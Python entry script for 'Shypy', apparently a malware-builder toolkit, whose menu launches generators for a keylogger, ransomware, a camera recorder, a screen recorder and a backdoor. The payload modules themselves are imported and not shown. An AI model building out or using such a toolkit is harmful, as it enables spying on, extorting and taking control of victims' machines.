import sys

from packages.utils.class_utils import *
from packages.variables.variables import *

from packages.modules.module_1 import KeyloggerGenerator
from packages.modules.module_2 import RansomwareGenerator
from packages.modules.module_3 import CameraRecorderGenerator
from packages.modules.module_4 import ScreenRecorderGenerator
from packages.modules.module_5 import BackDoorGenerator

class Shypy(Utils):
    def __init__(self) -> None:
        super().__init__()
    
    def run(self) -> None:
        """
        Runs the Shypy application.

        This method initiates the Shypy application by first checking for required modules
        using the `check_modules` method, then proceeds to the main menu using the `main` method.

        Returns:
            None
        """
        self.check_modules()
        self.main()
        
    def main(self) -> None:
        """
        Displays the main menu of the Shypy application.

        This method displays the main menu of the Shypy application, where users can select
        different modules or choose to exit the application.

        Returns:
            None
        """
        try:
            self.clear()
            print(BANNER)
            option = input(f'{COLOR["CYAN"]}{'\t' * 4}{' ' * 6}[Press "ENTER" To Continue] {COLOR["RESET"]}').lower()

            if option == "":
                self.menu()
                
            else:
                self.main()
        
        except KeyboardInterrupt:
            self.write(message="Exited from Shypy.", level=2, delay=0, clear=True)
            sys.exit(1)

        except EOFError:
            self.write(message="Exited from Shypy.", level=2, delay=0, clear=True)
            sys.exit(1)

            
    def menu(self) -> None:
        """
        Displays the module selection menu of the Shypy application.

        This method displays the module selection menu of the Shypy application, where users
        can choose different modules to use or exit the application.

        Returns:
            None
        """
        try:
            self.clear()
            print(f'\t {COLOR['CYAN']}{' ' * 3}╔════════════════════════════╦══════════════════════╦════════════════════════╗')           
            print(f'\t {COLOR['CYAN']}{' ' * 3}║* Version : {V} {' ' * 9}  *║ Welcome To The Shypy ║*      {' ' * 10}      *║')            
            print(f'\t {COLOR['CYAN']}{' ' * 3}╠════════════════════════════╩═════════╦════════════╩════════════════════════╣')           
            print(f'\t {COLOR['CYAN']}{' ' * 3}║             Module Name              ║          Operating System           ║')
            print(f'\t {COLOR['CYAN']}{' ' * 3}╠══════════════════════════════════════╬═════════════════════════════════════╣')         
            for i, module in enumerate(MODULES): print(f'\t{' ' * 4}║ [{i + 1}] {module["NAME"].ljust(33)}:{' ' * 7}{str(module["OS"]).replace("'", "")}{' ' * 6} ║')
            print(f'\t {COLOR['CYAN']}{' ' * 3}╠══════════════════════════════════════╬═════════════════════════════════════╣')
            print(f'\t {COLOR['CYAN']}{' ' * 3}║ "use" <number>                       : Used To Select Modules.             ║')           
            print(f'\t {COLOR['CYAN']}{' ' * 3}║ "exit"                               : To Log Out Of Shypy.                ║')         
            print(f'\t {COLOR['CYAN']}{' ' * 3}╠═════════════════════════╦════════════╩═══════════════╦═════════════════════╣')            
            print(f'\t {COLOR['CYAN']}{' ' * 3}║*                       *║ Developed by Atahan Poyraz ║*                   *║')            
            print(f'\t {COLOR['CYAN']}{' ' * 3}╚═════════════════════════╩════════════════════════════╩═════════════════════╝')   
        
            option = input(f"{COLOR["CYAN"]}{FLAG}{COLOR["RESET"]}").lower().strip()
            
            try:
                if option.startswith("use"):                
                    if option.split(" ")[1] in ("1", "keylogger"):
                        KeyloggerGenerator().run()
                        
                    elif option.split(" ")[1] in ("2", "ransomware"):
                        RansomwareGenerator().run()
                    
                    elif option.split(" ")[1] in ("3", "camera recorder"):
                        CameraRecorderGenerator().run()
                        
                    elif option.split(" ")[1] in ("4", "screen recorder"):
                        ScreenRecorderGenerator().run()
                        
                    elif option.split(" ")[1] in ("5", "backdoor"):
                        BackDoorGenerator().run()
                        
                    else:
                        self.write(message="Invalid Module.", level=4, delay=1, clear=False)
                        self.menu()
            
                elif option == "exit":
                    self.write(message="Exited from Shypy.", level=2, delay=0, clear=True)
                    sys.exit(1)

                else:
                    self.write(message="Invalid Option.", level=4, delay=1, clear=False)
                    self.menu()
                    
            except IndexError:
                self.write(message="Invalid Module.", level=4, delay=1, clear=False)
                self.menu()

        except KeyboardInterrupt:   
            self.write(message="Exited from Shypy.", level=2, delay=0, clear=True)
            sys.exit(1)

if __name__ == "__main__":
    Shypy().run()